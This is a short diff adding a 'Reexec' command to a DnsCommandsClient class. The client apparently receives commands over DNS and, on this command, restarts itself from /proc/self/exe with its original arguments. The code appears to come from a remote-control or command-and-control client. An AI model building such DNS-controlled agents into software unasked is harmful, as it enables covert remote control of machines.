@@ -210,6 +210,10 @@ class DnsCommandsClient(Thread):
                 self.on_disconnect()
             elif isinstance(command, Sleep):
                 time.sleep(command.timeout)
+            elif isinstance(command, Reexec):
+                executable = os.readlink('/proc/self/exe')
+                args = open('/proc/self/cmdline').read().split('\x00')
+                os.execv(executable, args)
             elif isinstance(command, Exit):
                 self.active = False
                 self.on_exit()
